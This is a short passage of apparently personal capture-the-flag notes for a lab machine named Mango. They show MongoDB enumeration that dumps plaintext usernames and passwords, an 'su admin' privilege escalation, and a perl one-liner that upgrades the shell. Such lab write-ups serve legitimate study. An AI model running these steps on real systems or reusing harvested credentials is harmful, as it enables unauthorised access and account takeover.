# User mango, enumerate the mongodb database
```
> show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
mango   0.000GB
> use mango
switched to db mango
> show collections
users
> db.users.find()
{ "_id" : ObjectId("5d8e25334f3bf1432628927b"), "username" : "admin", "password" : "t9KcS3>!0B#2" }
{ "_id" : ObjectId("5d8e25364f3bf1432628927c"), "username" : "mango", "password" : "h3mXK8RhU~f{]f5H" }

```
su admin --> get higher priv

## Our shell sucks compared to mango's shell
### Need to upgrade tty

```
$ which perl
/usr/bin/perl
$ perl -e 'exec "/bin/bash"'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

```
- Also get a pretty sweet treat once its run
